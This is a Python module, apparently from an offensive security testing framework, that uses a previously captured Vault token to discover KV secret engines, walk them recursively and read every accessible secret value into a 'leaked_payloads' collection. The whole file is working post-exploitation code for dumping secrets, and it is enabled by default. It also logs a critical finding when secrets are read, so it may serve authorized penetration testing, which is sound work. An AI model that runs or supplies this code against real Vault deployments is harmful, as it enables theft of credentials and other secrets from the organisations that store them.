from typing import Optional

import requests

from ..context import ExecutionContext
from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel


TIMEOUT = 10
DEFAULT_MAX_DEPTH = 5
FALLBACK_KV_MOUNTS = {
    "secret/": {"type": "kv", "options": {"version": "2"}},
    "kv/": {"type": "kv", "options": {"version": "2"}},
}


class SecretExfiltrationModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="secret_exfiltration.kv_dump",
            title="Secret Exfiltration via Captured Token",
            risk_level=RiskLevel.READ_ONLY,
            description=(
                "Uses a previously captured higher-privilege token to enumerate "
                "KV secret engines and read accessible secret values."
            ),
            default_enabled=True,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(
            getattr(context, "vault_addr", None)
            and _captured_token(context)
        )

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        params = params or {}
        token = _captured_token(context)
        if not token:
            return ExecutionResult(
                status="skipped",
                message="Secret exfiltration requires a captured token from a previous active step.",
                evidence={"missing": ["captured_token"]},
            )

        base_url = context.vault_addr.rstrip("/")
        timeout = params.get("timeout", TIMEOUT)
        verify_tls = params.get("verify_tls", getattr(context, "verify_tls", True))
        max_depth = int(params.get("max_depth", DEFAULT_MAX_DEPTH))
        headers = {
            "X-Vault-Token": token,
            "Content-Type": "application/json",
        }
        namespace = params.get("namespace", getattr(context, "namespace", None))
        if namespace:
            headers["X-Vault-Namespace"] = namespace

        try:
            mounts = _discover_kv_mounts(base_url, headers, timeout, verify_tls)
            leaked_payloads = {}
            errors = []

            for mount_name, mount_info in mounts.items():
                kv_version = _kv_version(mount_info)
                mount_path = mount_name.strip("/")
                _walk_kv_mount(
                    base_url,
                    headers,
                    timeout,
                    verify_tls,
                    mount_path,
                    kv_version,
                    "",
                    0,
                    max_depth,
                    leaked_payloads,
                    errors,
                )

            evidence = {
                "token_source": "captured_token",
                "kv_mounts": sorted(mounts.keys()),
                "total_leaked_secrets": len(leaked_payloads),
                "leaked_payloads": leaked_payloads,
                "errors": errors[:20],
            }

            if leaked_payloads:
                context.add_finding(
                    title="CRITICAL: Secret Exfiltration Successful",
                    description=(
                        "Captured token could read accessible KV secret values "
                        f"from {len(leaked_payloads)} path(s)."
                    ),
                    severity="CRITICAL",
                    evidence=evidence,
                )
                return ExecutionResult(
                    status="success",
                    message=f"Secret exfiltration succeeded for {len(leaked_payloads)} KV path(s).",
                    evidence=evidence,
                )

            return ExecutionResult(
                status="failed",
                message="No readable KV secret values were found with the captured token.",
                evidence=evidence,
            )

        except requests.RequestException as error:
            return ExecutionResult(
                status="error",
                message=f"Network error during secret exfiltration: {error}",
                evidence={"error": str(error)},
            )
        except ValueError as error:
            return ExecutionResult(
                status="error",
                message=f"Invalid Vault response during secret exfiltration: {error}",
                evidence={"error": str(error)},
            )


def _captured_token(context):
    return (
        getattr(context, "captured_token", None)
        or getattr(context, "escalated_token", None)
    )


def _discover_kv_mounts(base_url, headers, timeout, verify_tls):
    response = requests.get(
        f"{base_url}/v1/sys/mounts",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        return FALLBACK_KV_MOUNTS

    data = _safe_json(response).get("data", {})
    mounts = {
        mount_name: mount_info
        for mount_name, mount_info in data.items()
        if isinstance(mount_info, dict) and mount_info.get("type") == "kv"
    }
    return mounts or FALLBACK_KV_MOUNTS


def _walk_kv_mount(
    base_url,
    headers,
    timeout,
    verify_tls,
    mount_path,
    kv_version,
    relative_path,
    depth,
    max_depth,
    leaked_payloads,
    errors,
):
    if depth > max_depth:
        errors.append({"path": _display_path(mount_path, relative_path), "error": "max depth reached"})
        return

    keys, list_error = _list_kv_path(
        base_url,
        headers,
        timeout,
        verify_tls,
        mount_path,
        kv_version,
        relative_path,
    )

    if list_error:
        secret, read_error = _read_kv_secret(
            base_url,
            headers,
            timeout,
            verify_tls,
            mount_path,
            kv_version,
            relative_path,
        )
        if secret is not None:
            leaked_payloads[_display_path(mount_path, relative_path)] = secret
        elif relative_path:
            errors.append({"path": _display_path(mount_path, relative_path), "error": read_error or list_error})
        return

    for key in keys:
        child_path = _join_path(relative_path, key.rstrip("/"))
        if key.endswith("/"):
            _walk_kv_mount(
                base_url,
                headers,
                timeout,
                verify_tls,
                mount_path,
                kv_version,
                child_path,
                depth + 1,
                max_depth,
                leaked_payloads,
                errors,
            )
            continue

        secret, read_error = _read_kv_secret(
            base_url,
            headers,
            timeout,
            verify_tls,
            mount_path,
            kv_version,
            child_path,
        )
        if secret is not None:
            leaked_payloads[_display_path(mount_path, child_path)] = secret
        elif read_error:
            errors.append({"path": _display_path(mount_path, child_path), "error": read_error})


def _list_kv_path(base_url, headers, timeout, verify_tls, mount_path, kv_version, relative_path):
    if kv_version == 1:
        endpoint = f"{base_url}/v1/{mount_path}/{relative_path}".rstrip("/")
    else:
        endpoint = f"{base_url}/v1/{mount_path}/metadata/{relative_path}".rstrip("/")

    response = requests.request(
        "LIST",
        endpoint,
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        return [], f"LIST status_code: {response.status_code}"

    keys = _safe_json(response).get("data", {}).get("keys", []) or []
    return [str(key) for key in keys], None


def _read_kv_secret(base_url, headers, timeout, verify_tls, mount_path, kv_version, relative_path):
    if not relative_path:
        return None, "empty secret path"

    if kv_version == 1:
        endpoint = f"{base_url}/v1/{mount_path}/{relative_path}".rstrip("/")
    else:
        endpoint = f"{base_url}/v1/{mount_path}/data/{relative_path}".rstrip("/")

    response = requests.get(
        endpoint,
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        return None, f"GET status_code: {response.status_code}"

    data = _safe_json(response).get("data", {})
    if kv_version == 2:
        data = data.get("data", {})
    return data, None


def _kv_version(mount_info):
    options = mount_info.get("options", {}) if isinstance(mount_info, dict) else {}
    return 2 if options.get("version") == "2" else 1


def _safe_json(response):
    try:
        data = response.json()
    except ValueError as error:
        raise ValueError(f"invalid json response: {response.text[:200]}") from error
    return data if isinstance(data, dict) else {}


def _join_path(parent, child):
    if not parent:
        return child.strip("/")
    return f"{parent.strip('/')}/{child.strip('/')}"


def _display_path(mount_path, relative_path):
    if not relative_path:
        return f"{mount_path}/"
    return f"{mount_path}/{relative_path.strip('/')}"
